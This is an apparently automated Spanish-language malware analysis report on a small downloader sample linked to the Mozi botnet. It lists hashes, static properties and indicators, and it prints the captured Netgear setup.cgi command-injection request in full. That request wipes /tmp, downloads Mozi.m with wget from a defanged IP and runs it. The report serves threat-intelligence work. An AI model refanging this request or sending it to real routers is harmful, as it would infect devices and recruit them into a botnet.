# 🧬 Payload Analysis

`68d1b9dc33572a0f36c02f25783f403340cb330e3ccd37bbd83556879a0489cf`

## 📌 Resumen

Texto ASCII de 176 B. La evidencia disponible identifica capacidad de descarga remota. Recurso remoto principal: `netgear` en `hxxp://45.230.66.XXX:11229/Mozi.m+-O+/tmp/netgear`. **Comandos observados o extraídos, en orden de aparición en la evidencia:**

1. `sh netgear`
2. `wget hxxp://45.230.66.XXX:11229/Mozi.m -O /tmp/netgea` Los comandos se presentan como evidencia observada o extraída; no se afirma ejecución salvo que la relación registrada sea `executed`. **Ficha malware:** [malware-like/oraculo/downloader/68d1b9dc33572a0f36c02f25783f403340cb330e3ccd37bbd83556879a0489cf.md](../../../../../malware-like/oraculo/downloader/68d1b9dc33572a0f36c02f25783f403340cb330e3ccd37bbd83556879a0489cf.md)


## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T20:30:16.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `68d1b9dc33572a0f36c02f25783f403340cb330e3ccd37bbd83556879a0489cf`
- **SHA1:** `935a498c3b361e342a52c3881a14ec4f171bb122`
- **MD5:** `345f91ee1f58e93f65a796145699261a`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with CRLF line terminators |
| Tamaño | 176 B |
| Entropía | 5.16 |
| Strings | 1 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Limpieza**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with CRLF line terminators; iocs=4

## 🖥️ Comandos observados / extraídos

```text
GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+hxxp://45.230.66.XXX:11229/Mozi.m+-O+/tmp/netgea
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| url | hxxp://45.230.66.XXX:11229/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 | strings |
| ip | 45.230.66.XXX | static_analysis |
| command | GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+hxxp://45.230.66.XXX:11229/Mozi.m+-O+/tmp/netgea | strings |
| hash | 68d1b9dc33572a0f36c02f25783f403340cb330e3ccd37bbd83556879a0489cf | static_analysis |

## 🔎 Triage

| Campo | Valor |
| --- | --- |
| Categoría | structured text |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
